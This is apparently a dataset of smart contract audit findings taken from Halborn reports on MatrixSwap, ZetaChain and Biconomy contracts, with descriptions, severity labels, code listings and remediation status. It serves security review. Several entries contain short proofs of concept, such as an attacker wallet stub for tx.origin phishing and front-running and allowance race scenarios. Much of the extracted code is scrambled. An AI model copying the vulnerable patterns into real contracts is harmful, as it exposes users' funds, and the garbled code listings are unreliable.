        "body": "State variables can be declared as constant or immutable. In both cases, the variables cannot be modified after the contract has been constructed. For constant variables, the value has to be fixed at compile-time, while for immutable, it can still be assigned at construction time. The following state variables are missing the constant modifier: Listing 2: MatrixStaking.sol 0 xA102072A4C07F06EC3B4900FDC4C7B80b6c57429 15 IUniswapV2Router02 public uniswapV2Router 16 17 ); 18 address public usdc = 0 x2791Bca1f2de4661ED88A30C99A7a9449Aa84174 ; = IUniswapV2Router02 ( Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to add the constant modifier to the state variable mentioned. Remediation Plan: SOLVED: The MatrixSwap team declared the state variable mentioned as constant 16 ",
        "labels": [
            "Halborn",
            "MatrixSwap_Staking",
            "Severity: Informational"
        ]
    },
    {
        "title": "STATE VARIABLE MISSING IMMUTABLE MODIFIER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract MatrixStaking, the state variable matrix can be declared as immutable to reduce the gas costs. The immutable keyword was added to Solidity in 0.6.5. State variables can be marked immutable which causes them to be read-only, but only assignable in the constructor. Code Location: Listing 3: MatrixStaking.sol 14 IERC20 public matrix ; Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to add the immutable modifier to the matrix state variable. Remediation Plan: SOLVED: The MatrixSwap team declared the state variable mentioned as immutable 17 ",
        "labels": [
            "Halborn",
            "MatrixSwap_Staking",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the following contracts there are functions marked as public but they are never directly called within the same contract or in any of their descendants: MatrixStaking.sol - enter() (MatrixStaking.sol#30-46) - leave() (MatrixStaking.sol#50-57) Risk Level: Likelihood - 1 Impact - 1 Recommendation: If the functions are not intended to be called internally or by their descendants, it is better to mark all of these functions as external to reduce the gas costs. Remediation Plan: SOLVED: The MatrixSwap team declared the mentioned functions as external. 18 ",
        "labels": [
            "Halborn",
            "MatrixSwap_Staking",
            "Severity: Informational"
        ]
    },
    {
        "title": "INCORRECT ERC20 TOKEN NAME",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The contract MatrixStaking is an ERC20 contract, which its ERC20.name() is Matrix and its ERC20.symbol() is xMatrix. Since this contract will be minting xMatrix tokens, it is recommended to set its ERC20.name() to xMatrix instead. Code location: Listing 4: MatrixStaking.sol 12 contract MatrixStaking is ERC20 ( \" Matrix \" , \" xMatrix \" ) , Ownable { Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to set the contract ERC20.name() to xMatrix instead of Matrix. Remediation Plan: SOLVED: The MatrixSwap team set the contract ERC20.name() to xMatrix instead of Matrix. 19 ",
        "labels": [
            "Halborn",
            "MatrixSwap_Staking",
            "Severity: Informational"
        ]
    },
    {
        "title": "HAL01",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ZetaChain_ZetaNode_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "During the code review, It has been noticed that a potential issue with the implementation of the receive function in the smart contract. The receive function is not restricted to WETH (Wrapped Ether) token transfers, which could lead to unexpected token transfers to your smart contract. The unrestricted receive function may allow users to send native tokens to the contract. This could result in the undesired accumulation of tokens within the contract, making them permanently locked and inaccessible to the intended recipients. Code Location: ConnectorZEVM.sol#L74 Listing 1 1 receive () external payable {} Proof of Concept: 1. Send native token to ConnectorZEVM contract. 2. Native token sent to ConnectorZEVM contract will be locked. BVSS: AO:A/AC:M/AX:L/C:M/I:M/A:M/D:H/Y:M/R:N/S:U (8.4) 22 Recommendation: To address this issue, we recommend implementing a check within the receive function to ensure that only WETH token transfers are allowed. This can be achieved by comparing the address of the sender or the transferred token with the known WETH contract address. This modification will prevent accidental or malicious transfers of unsupported tokens to your smart contract, ensuring that only the intended token is accepted. Remediation Plan: SOLVED: The ZetaChain team solved the issue by adding the check. Commit ID : 51dc57035a7f9feb68aa16f45752d46bb5ce78b0 23 ",
        "labels": [
            "Halborn",
            "ZetaChain_ZetaNode",
            "Severity: High"
        ]
    },
    {
        "title": "HAL02",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ZetaChain_ZetaNode_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "During the audit, it was discovered that the smart contract does not support Fee-On-Transfer or deflationary tokens. These token types im- plement a fee mechanism, where a percentage of each token transfer is either burned, redistributed to token holders, or allocated to a specific address (e.g., a treasury or liquidity pool). The absence of support for these tokens may limit the smart contracts compatibility with various token projects and ecosystems. Code Location: /ERC20Custody.sol#LL126-L152 Listing 2 function deposit ( bytes calldata recipient , IERC20 asset , if ( paused ) { revert IsPaused () ; revert NotWhitelisted () ; } if (! whitelisted [ asset ]) { } if ( address ( zeta ) != address (0) ) { 1  uint256 amount , bytes calldata message ) external { 2 3 4 5 6 7 8 9 10 11 12 13 14 15  amount ) external { 16 17 revert IsPaused () ; if ( paused ) { } zeta . transferFrom ( msg . sender , TSSAddress , zetaFee ); } asset . transferFrom ( msg . sender , address ( this ) , amount ); emit Deposited ( recipient , asset , amount , message ); function withdraw ( address recipient , IERC20 asset , uint256 24 18 19 20 21 22 23 24 25 26 27 } } if ( msg . sender != TSSAddress ) { revert InvalidSender () ; } if (! whitelisted [ asset ]) { revert NotWhitelisted () ; } IERC20 ( asset ). transfer ( recipient , amount ); emit Withdrawn ( recipient , asset , amount ); Proof of Concept: 1. Assume transfer fee to be 5% and ERC20Custody.sol has 200 token. 2. TSS Address deposit 100 tokens. Now, ERC20Custody.sol has 295 tokens. 3. TSS Address calls the method to withdraw 100 tokens. 4. ERC20Custody.sol ends up having 195 tokens. BVSS: AO:A/AC:M/AX:L/C:M/I:M/A:M/D:H/Y:L/R:N/S:U (8.0) Recommendation: Consider checking the before and after balance of token transfer on the deposit and withdraw functions. Remediation Plan: SOLVED: The ZetaChain team solved the issue by adding the pre-post balance check. Commit ID : 3637741fb8b7e036dd81ca763f9fe2f548bcbfec 25 ",
        "labels": [
            "Halborn",
            "ZetaChain_ZetaNode",
            "Severity: High"
        ]
    },
    {
        "title": "HAL03",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ZetaChain_ZetaNode_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "the not does given smart utilize contract SafeTransfer The or SafeTransferFrom functions for handling token transfers. These functions are part of the OpenZeppelin SafeERC20 library and are designed to provide additional safety checks and error handling when working with ERC20 tokens. Without these safety measures in place, the smart contract may encounter unexpected issues or revert without providing clear error messages during token transfers, which can lead to confusion and difficulty in diagnosing problems. Code Location: /ERC20Custody.sol#LL126-L152 Listing 3 function deposit ( bytes calldata recipient , IERC20 asset , if ( paused ) { revert IsPaused () ; revert NotWhitelisted () ; } if (! whitelisted [ asset ]) { 1  uint256 amount , bytes calldata message ) external { 2 3 4 5 6 7 8 9 10 11 12 13 14 15  amount ) external { } if ( address ( zeta ) != address (0) ) { } zeta . transferFrom ( msg . sender , TSSAddress , zetaFee ); } asset . transferFrom ( msg . sender , address ( this ) , amount ); emit Deposited ( recipient , asset , amount , message ); function withdraw ( address recipient , IERC20 asset , uint256 26 16 17 18 19 20 21 22 23 24 25 26 27 if ( paused ) { revert IsPaused () ; } if ( msg . sender != TSSAddress ) { revert InvalidSender () ; } if (! whitelisted [ asset ]) { revert NotWhitelisted () ; } IERC20 ( asset ). transfer ( recipient , amount ); emit Withdrawn ( recipient , asset , amount ); } Proof of Concept: Listing 4 // --- Token --- function transfer ( address dst , uint wad ) external returns ( return transferFrom ( msg . sender , dst , wad ); } function transferFrom ( address src , address dst , uint wad ) if ( balanceOf [ src ] < wad ) return false ; // insufficient src bal if ( balanceOf [ dst ] >= ( type ( uint256 ). max - wad )) return 1 contract NoRevertToken { 2 3 4 5  bool ) { 6 7 8  virtual public returns ( bool ) { 9  10  false ; // dst bal too high 11 12  type ( uint ). max ) { 13 if ( src != msg . sender && allowance [ src ][ msg . sender ] !=  14  ] - wad ; 15 16 17 18 if ( allowance [ src ][ msg . sender ] < wad ) return false ; // insufficient allowance allowance [ src ][ msg . sender ] = allowance [ src ][ msg . sender } balanceOf [ src ] = balanceOf [ src ] - wad ; balanceOf [ dst ] = balanceOf [ dst ] + wad ; 27 emit Transfer ( src , dst , wad ); return true ; 19 20 21 22 23 24 } } BVSS: AO:A/AC:M/AX:L/C:M/I:M/A:M/D:H/Y:L/R:N/S:U (8.0) Recommendation: To mitigate potential issues and enhance the safety of the smart contract, we recommend incorporating the use of SafeTransfer and SafeTransferFrom functions from the OpenZeppelin SafeERC20 library. Remediation Plan: SOLVED: The ZetaChain team solved the issue by using safeTransfer/safe- TransferFrom. Commit ID : 46a1be64690774065539868b23aad710e17e6099 28 ",
        "labels": [
            "Halborn",
            "ZetaChain_ZetaNode",
            "Severity: High"
        ]
    },
    {
        "title": "HAL04",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ZetaChain_ZetaNode_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "During the code review, It has been noticed that the ZRC20 implementation is not resistant to the well-known ERC20 race condition issue, also known as the allowance front-running problem. This issue occurs when a user attempts to update their token allowance for a spender while the spender is simultaneously trying to use the existing allowance. If the spenders transaction is confirmed before the users allowance update, the user might inadvertently grant the spender a higher allowance than intended. Code Location: /contracts/zevm/ZRC20.sol Listing 5 function _approve ( address owner , address spender , uint256 require ( owner != address (0) , \" ERC20 : approve from the zero require ( spender != address (0) , \" ERC20 : approve to the zero 1  amount ) internal virtual { 2  address \" ); 3  address \" ); 4 5 6 7 } _allowances [ owner ][ spender ] = amount ; emit Approval ( owner , spender , amount ); Proof of Concept: 1. Alice initiates the approve(Bob, 500) function, granting Bob the permission to utilize 500 tokens. 2. Subsequently, Alice reconsiders and calls approve(Bob, 1000), which 29 amends Bobs spending allowance to 1000 tokens. 3. Bob observes the transaction and swiftly invokes transferFrom(Alice, X, 500) before its mining completion. 4. If Bobs transaction is mined before Alices, Bob will successfully transfer 500 tokens. Once Alices transaction has been mined, Bob can proceed to call transferFrom(Alice, X, 1000). Bob has transferred 1500 tokens even though this was not Alices intention. BVSS: AO:A/AC:L/AX:L/C:M/I:M/A:M/D:M/Y:L/R:P/S:C (5.9) Recommendation: To mitigate the race condition issue and enhance the security and relia- bility of the ZRC20 token implementation, we recommend implementing the increaseAllowance and decreaseAllowance functions, instead of only using the approve function for modifying allowances. These functions allow users to update allowance values without first having to reduce them to zero, thus reducing the likelihood of encountering race condition issues. Remediation Plan: SOLVED: increaseAllowance and decreaseAllowance functions. ZetaChain team solved The the issue Commit ID : 51dc57035a7f9feb68aa16f45752d46bb5ce78b0 by implementing 30 ",
        "labels": [
            "Halborn",
            "ZetaChain_ZetaNode",
            "Severity: Medium"
        ]
    },
    {
        "title": "HAL05",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ZetaChain_ZetaNode_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The given code uses tx.origin as a parameter in the ZetaSent event emission. The tx.origin variable represents the original initiator of the transaction, which might not always be the same as msg.sender, which represents the direct caller of the function. The tx.origin variable refers to the original sender of a transaction, and its misuse can make the smart contract susceptible to phishing attacks. In a phishing attack, a malicious contract can be created to trick users into interacting with it. When users execute transactions through the malicious contract, the tx.origin variable will still point to the original sender, allowing the attacker to bypass access controls or manipulate the contract state. To mitigate this vulnerability, it is recommended to replace the use of tx. origin with msg.sender, which provides the address of the direct sender of the transaction. This change ensures that only the intended sender can interact with the smart contract, effectively eliminating the risk of phishing attacks. Code Location: ConnectorZEVM.sol#L83 Listing 6 // transfer wzeta to \" fungible \" module , which will be function send ( ZetaInterfaces . SendInput calldata input ) 1  external { 2  burnt by the protocol post processing via hooks . 3  ) , input . zetaValueAndGas ) == true , \" wzeta . transferFrom fail \" ); WZETA ( wzeta ). withdraw ( input . zetaValueAndGas ); 4 ( bool sent ,) = FUNGIBLE_MODULE_ADDRESS . call { value : input . 5  zetaValueAndGas }( \" \"); require ( WZETA ( wzeta ). transferFrom ( msg . sender , address ( this 31 6 7 8 9 10 11 12 13 14 15 16 17 require ( sent , \" Failed to send Ether \"); emit ZetaSent ( tx . origin , msg . sender , input . destinationChainId , input . destinationAddress , input . zetaValueAndGas , input . destinationGasLimit , input . message , input . zetaParams ); } Proof of Concept: Listing 7 function send ( ZetaInterfaces . SendInput calldata input ) address payable owner ; 1 pragma solidity >=0.7.0 <0.9.0; 2 interface ConnectorZEVM { 3  external 4 } 5 6 contract AttackerWallet { 7 8 9 10 11 12 13 14 15 16 } constructor () { receive () external payable { } } owner = payable ( msg . sender ); ConnectorZEVM ( msg . sender ). send ( input ); BVSS: AO:A/AC:L/AX:L/C:M/I:M/A:M/D:N/Y:N/R:F/S:C (2.3) 32 Recommendation: To mitigate the risks associated with the use of tx.origin, it is advised to replace tx.origin with msg.sender in the ZetaSent event emission. msg .sender provides a more secure way of identifying the direct caller of the function, reducing the possibility of attacks. Remediation Plan: RISK ACCEPTED: The ZetaChain team accepted the risk of this finding. 33 ",
        "labels": [
            "Halborn",
            "ZetaChain_ZetaNode",
            "Severity: Low"
        ]
    },
    {
        "title": "HAL06",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ZetaChain_ZetaNode_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The current implementation of the smart contract does not define an upper Without an upper limit in place, there bound for the fee structure. is a possibility that the fees could be set to disproportionately high values, either due to manipulation, incorrect configuration, or a bug in the smart contract. This can lead to a negative user experience, as users may be charged excessive fees for interacting with the contract. Code Location: /evm/erc20custody/ERC20Custody.sol#L70 Listing 8 function updateZetaFee ( uint256 _zetaFee ) external { if ( msg . sender != TSSAddress ) { revert InvalidSender () ; } if ( _zetaFee == 0) { revert ZeroFee () ; } zetaFee = _zetaFee ; } 1 2 3 4 5 6 7 8 9 BVSS: AO:A/AC:L/AX:L/C:M/I:M/A:M/D:N/Y:N/R:F/S:C (2.3) 34 Recommendation: To address the issue and enhance the fee structures security and pre- dictability, we recommend defining an upper bound for the fee rates. This can be done by implementing a maximum fee rate value and a corresponding validation check when setting the fee rate. Remediation Plan: SOLVED: The ZetaChain team solved the issue by adding the upper bound. Commit ID : 51dc57035a7f9feb68aa16f45752d46bb5ce78b0 35 ",
        "labels": [
            "Halborn",
            "ZetaChain_ZetaNode",
            "Severity: Low"
        ]
    },
    {
        "title": "HAL07",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ZetaChain_ZetaNode_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "During the code review, It has been noticed that ZetaSent events parame- ters are not validated. For instance, destinationChain id is not checked on the event, that can cause locking of funds on the one side of the chain. Code Location: /contracts/zevm/ConnectorZEVM.sol#L85-L90 Listing 9 address public wzeta ; address public constant FUNGIBLE_MODULE_ADDRESS = payable (0 event ZetaSent ( address sourceTxOriginAddress , address indexed zetaTxSenderAddress , uint256 indexed destinationChainId , bytes destinationAddress , uint256 zetaValueAndGas , uint256 destinationGasLimit , bytes message , bytes zetaParams 1 contract ZetaConnectorZEVM is ZetaInterfaces { 2 3  x735b14BB79463307AAcBED86DAf3322B1e6226aB ); 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 constructor ( address _wzeta ) { wzeta = _wzeta ; ); } // the contract will receive ZETA from WETH9 . withdraw () receive () external payable {} 36 require ( WZETA ( wzeta ). transferFrom ( msg . sender , address ( this // transfer wzeta to \" fungible \" module , which will be function send ( ZetaInterfaces . SendInput calldata input ) 22 23  external { 24  burnt by the protocol post processing via hooks . 25  ) , input . zetaValueAndGas ) == true , \" wzeta . transferFrom fail \" ); WZETA ( wzeta ). withdraw ( input . zetaValueAndGas ); 26 27 ( bool sent ,) = FUNGIBLE_MODULE_ADDRESS . call { value : input .  zetaValueAndGas }( \" \"); 28 29 30 31 32 33 34 35 36 37 38 39 require ( sent , \" Failed to send Ether \"); emit ZetaSent ( tx . origin , msg . sender , input . destinationChainId , input . destinationAddress , input . zetaValueAndGas , input . destinationGasLimit , input . message , input . zetaParams ); } BVSS: AO:A/AC:L/AX:L/C:M/I:M/A:M/D:N/Y:N/R:F/S:C (2.3) Recommendation: Consider validating all related parameters on the function. Remediation Plan: RISK ACCEPTED: The ZetaChain team accepted the risk of this finding. 37 ",
        "labels": [
            "Halborn",
            "ZetaChain_ZetaNode",
            "Severity: Low"
        ]
    },
    {
        "title": "HAL08",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ZetaChain_ZetaNode_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the provided code snippet, the withdraw function requires the user to transfer a gas fee (gasFee) and a protocol flat fee (PROTOCOL_FLAT_FEE) to the FUNGIBLE_MODULE_ADDRESS before proceeding with the withdrawal. During times of network congestion or high gas prices, the total fees (gasFee + PROTOCOL_FLAT_FEE) might become prohibitively expensive for some users. As a result, these users might be unable to withdraw their tokens, effectively blocking them from accessing their funds. The potential for blocked withdraw operations due to high gas fees can result in a negative user experience and may erode trust in the smart contract. Users who are unable to withdraw their tokens might be forced to wait for lower gas prices, which could take an indefinite amount of time, or they might have to pay exorbitant fees to access their funds. Code Location: /contracts/zevm/ZRC20.sol#L152 Listing 10 function withdraw ( bytes memory to , uint256 amount ) external ( address gasZRC20 , uint256 gasFee )= withdrawGasFee () ; require ( IZRC20 ( gasZRC20 ). transferFrom ( msg . sender , 1  override returns ( bool ) { 2 3  FUNGIBLE_MODULE_ADDRESS , gasFee + PROTOCOL_FLAT_FEE ) , \" transfer gas  fee failed \" ); 4 5 6  PROTOCOL_FLAT_FEE ); 7 8 _burn ( msg . sender , amount ); emit Withdrawal ( msg . sender , to , amount , gasFee , return true ; } 38 BVSS: AO:A/AC:M/AX:L/C:L/I:L/A:L/D:L/Y:N/R:N/S:U (2.9) Recommendation: Consider adjusting the required gas fees based on the current gas price, network conditions, or other factors, ensuring that users are not over- charged during high gas price periods. Remediation Plan: RISK ACCEPTED: The ZetaChain team accepted the risk of this finding. 39 ",
        "labels": [
            "Halborn",
            "ZetaChain_ZetaNode",
            "Severity: Low"
        ]
    },
    {
        "title": "HAL09",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ZetaChain_ZetaNode_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The contracts are missing slippage checks, which can lead to being vul- nerable to sandwich attacks. Sandwich attacks are prevalent in the decentralized finance (DeFi) sector. These attacks occur when an adver- sary observes a trade involving assets X and Y and preemptively purchases asset Y. Following the execution of the victims trade, the attacker sells the acquired amount of asset Y, capitalizing on the inflated price. The attacker profits by exploiting the knowledge of an impending trade that will increase the assets price, ultimately causing a financial loss for the protocol. Lacking appropriate slippage checks, trades may be executed at unfavorable prices, resulting in the acquisition of fewer tokens than the fair market value dictates. Code Location: /zevm/SystemContract.sol#LL48-L59 Listing 11 function depositAndCall ( address zrc20 , uint256 amount , address target , bytes calldata message 1 2 3 4 5 6 7  CallerIsNotFungibleModule () ; 8  ( this )) revert InvalidTarget () ; ) external { if ( msg . sender != FUNGIBLE_MODULE_ADDRESS ) revert if ( target == FUNGIBLE_MODULE_ADDRESS || target == address 40 IZRC20 ( zrc20 ). deposit ( target , amount ); zContract ( target ). onCrossChainCall ( zrc20 , amount , message ) 9 10 11  ; 12 } BVSS: AO:A/AC:M/AX:L/C:L/I:L/A:L/D:L/Y:N/R:N/S:U (2.9) Recommendation: Without appropriate slippage checks, trades may be executed at unfavorable prices, resulting in the acquisition of fewer tokens than the fair market value dictates. To mitigate this risk, we recommend implementing minimum return amount checks in the following manner:  Introduce a function parameter to be determined by the transaction initiator, ensuring that the received amount exceeds the specified parameter. Remediation Plan: RISK ACCEPTED: The ZetaChain team accepted the risk of this finding. 41 4.10 (HAL-10) HAL10 - THE CONTRACTS ARE MISSING NATSPEC - INFORMATIONAL (0.0) ",
        "labels": [
            "Halborn",
            "ZetaChain_ZetaNode",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNWANTED TOKEN MINTING ON CONTRACT UPGRADE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Token_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The BICO Token contract has multiple features such as Governed, AccessControl, Pausable and ContextUpgradeable. Also, this contract uses a Proxy Contract to upgrade its context to implement new features or fixing possible security issues. First of all, Token Contract needs to be deployed. This step is followed by the Proxy Contract initializing the Token Contract. During the initialization process, Token fields are set by the initialize function. Also, 1000000000 BICO tokens will be minted during that process. Calling the __BicoTokenImplementation_init_unchained function will mint these tokens on every contract upgrade. However, these tokens should be minted on the first initialization only. Code Location: Listing (Lines 580,583) 1: contracts/bico-token/bico/BicoTokenImplementation.sol 580 581 582 583 584 585 586 587 588 589 590 591 592 593 594 function __BicoTokenImplementation_init_unchained ( address beneficiary ) internal initializer { _name = \" Biconomy Token \" ; _symbol = \" BICO \"; _mint ( msg . sender , 1000000000 * 10 ** decimals () ); _setupRole ( DEFAULT_ADMIN_ROLE , msg . sender ); _setupRole ( PAUSER_ROLE , msg . sender ); // EIP -712 domain separator DOMAIN_SEPARATOR = keccak256 ( abi . encode ( DOMAIN_TYPE_HASH , keccak256 ( \" Biconomy Token \" ) , keccak256 ( \"1 \" ) , address ( this ) , bytes32 ( getChainId () ) 13 595 596 597 } ) ); Risk Level: Likelihood - 3 Impact - 3 Recommendations: It is recommended to implement an additional check to the contract for validating if the contract was already initialized. Remediation Plan: Biconomy Team solved this issue by moving the mint function SOLVED: into initialize function. Also, two new variables(_initializedVersion , mintingAllowedAfter) are implemented to control if the contract is initialized for the first time. Commit ID: 1b38ce8d9b86ff6238e93c883e69538f46472077 14 ",
        "labels": [
            "Halborn",
            "Biconomy_Token",
            "Severity: Medium"
        ]
    },
    {
        "title": "POSSIBLE FRONT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Token_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "Token Contract initializer were missing access controls, allowing any user to initialize the contract. By front-running the contract, deployers can initialize the contract. Also, on every initialization, contract mints 1000000000 BICO tokens to the beneficiary address. So, it is possible to any front-runner attacker gets all supply during the initialization by front-running. In addition, the attacker acclaim the trustedForwarder and Contract Admin roles by exploiting this vulnerability. Code Location: Listing 2: (Lines 580,583,584,585) contracts/bico-token/bico/BicoTokenImplementation.sol 564 function initialize ( address beneficiary , address trustedForwarder ) 565 566 567 568 569 570 571 572 573 574 575 576 577 578 579 580 public initializer { __BicoTokenImplementation_init_unchained ( beneficiary ); __ERC2771Context_init ( trustedForwarder ); __Pausable_init () ; __AccessControl_init () ; __Governed_init ( msg . sender ); } function __BicoTokenImplementation_init ( address beneficiary , address trustedForwarder ) internal initializer { __ERC2771Context_init ( trustedForwarder ); __Pausable_init () ; __AccessControl_init () ; __Governed_init ( msg . sender ); __BicoTokenImplementation_init_unchained ( beneficiary ); } function __BicoTokenImplementation_init_unchained ( address 15 581 582 583 584 585 586 587 588 589 590 591 592 593 594 595 596 597 beneficiary ) internal initializer { _name = \" Biconomy Token \" ; _symbol = \" BICO \"; _mint ( msg . sender , 1000000000 * 10 ** decimals () ); _setupRole ( DEFAULT_ADMIN_ROLE , msg . sender ); _setupRole ( PAUSER_ROLE , msg . sender ); // EIP -712 domain separator DOMAIN_SEPARATOR = keccak256 ( abi . encode ( DOMAIN_TYPE_HASH , keccak256 ( \" Biconomy Token \" ) , keccak256 ( \"1 \" ) , address ( this ) , bytes32 ( getChainId () ) ) ); } Risk Level: Likelihood - 2 Impact - 4 Recommendations: The BICO Token Contract should be initialized immediately by correct user after deployment. This can be achieved by deployment test script. Use a factory pattern that will deploy and initialize the contracts atomically to prevent front-running of the initialization. Additionally, access control for initialize function should be implemented. 16 Remediation Plan: SOLVED: Biconomy Team fixed this issue by directly initializing the contract after deploying the contract in the deployment and upgrade test scripts. Commit ID: ccdbbe9087a1139946a9b3fc4d9f38b537da241d 17 ",
        "labels": [
            "Halborn",
            "Biconomy_Token",
            "Severity: Medium"
        ]
    },
    {
        "title": "LACK OF ZERO ADDRESS CONTROL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Token_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "Some functions are missing address validation. Every address should be validated and checked that is different than zero. During the test, it was determined that the address(0) control was not performed on the setTrustedForwarder function. Code Location: Listing (Lines 1034,1035) 3: contracts/bico-token/bico/BicoTokenImplementation.sol 1034 function setTrustedForwarder ( address payable _forwarder ) external onlyGovernor { 1035 1036 1037 } _trustedForwarder = _forwarder ; emit TrustedForwarderChanged ( _forwarder , msg . sender ); Risk Level: Likelihood - 3 Impact - 2 Recommendations: It is recommended to validate that every address input is different than zero address. 18 Remediation Plan: SOLVED: address control into the setTrustedForwarder function. Biconomy Team has resolved this issue by implementing zero Commit ID: 5bc8cb7d8815aeab151277c717f58042d002cd52 19 ",
        "labels": [
            "Halborn",
            "Biconomy_Token",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING RE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Token_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "To protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the withdraw function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against reentrancy attacks. Code Location: Listing 4: Missing Re-Entrancy Guard 1 transfer ( address recipient , uint256 amount ) 2 approve ( address spender , uint256 amount ) 3 transferFrom ( address sender , address recipient , uint256 amount ) 4 increaseAllowance ( address spender , uint256 addedValue ) 5 decreaseAllowance ( address spender , uint256 subtractedValue ) 6 function approveWithSig ( uint8 _v , bytes32 _r , bytes32 _s , uint256 _deadline , address _sender , uint256 _batchId , address _recipient , uint256 _amount ) 7 function transferWithSig ( uint8 _v , bytes32 _r , bytes32 _s , uint256 _deadline , address _sender , uint256 _batchId , address _recipient , uint256 _amount ) Risk Level: Likelihood - 2 Impact - 2 20 Recommendations: In the BicoTokenImplementation.sol contract, functions above are missing a nonReentrant guard. Use the nonReentrant modifier to avoid introducing future vulnerabilities. Remediation Plan: SOLVED: Biconomy Team solved this issue by appending OpenZeppelin Reen- trancyGuard library to the Token contract. Halborn Team has confirmed that this library implemented properly. Commit ID: a1974759b906f6f86d7999e66c10302611631eef 21 ",
        "labels": [
            "Halborn",
            "Biconomy_Token",
            "Severity: Low"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Token_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The project contains many instances of floating pragma. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, either an outdated compiler version that might introduce bugs that affect the contract system negatively or a pragma version too recent which has not been extensively tested. Code Location: Listing 5 1 libs / BaseRelayRecipient . sol :3: pragma solidity ^0.8.0; 2 libs / IRelayRecipient . sol :2: pragma solidity ^0.8.0; 3 test / Greeter . sol :2: pragma solidity ^0.8.0; 4 BiconomyTokenTransparent . sol :4: pragma solidity ^0.8.2; 5 bico / BicoTokenProxy . sol :4: pragma solidity ^0.8.0; 6 bico / ERC20Meta . sol :3: pragma solidity ^0.8.0; 7 bico / BicoTokenImplementation . sol :2: pragma solidity ^0.8.0; 8 bico / BicoTokenV2 . sol :2: pragma solidity ^0.8.0; 9 bico / BicoToken . sol :4: pragma solidity ^0.8.0; 10 bico / BicoToken . sol :9: pragma solidity ^0.8.0; 11 bico / BicoToken . sol :97: pragma solidity ^0.8.0; 12 bico / BicoToken . sol :124: pragma solidity ^0.8.0; 13 bico / BicoToken . sol :335: pragma solidity ^0.8.0; 14 bico / BicoToken . sol :402: pragma solidity ^0.8.0; 15 BiconomyTokenUUPS . sol :5: pragma solidity ^0.8.2; Risk Level: Likelihood - 2 Impact - 2 22 Recommendations: Consider locking the pragma version with known bugs for the compiler When possible, do not use floating pragma in the final live version. deployment. Specifying a fixed compiler version ensures that the bytecode produced does not vary between builds. This is especially important if you rely on bytecode-level verification of the code. Remediation Plan: SOLVED: This finding was fixed by the Biconomy Team by locking the pragma version. Since the new commit, the Caret(^) symbol in all pragma versions has been removed. Commit ID: 5bc8cb7d8815aeab151277c717f58042d002cd52 23 ",
        "labels": [
            "Halborn",
            "Biconomy_Token",
            "Severity: Low"
        ]
    },
    {
        "title": "PRAGMA VERSION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Token_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
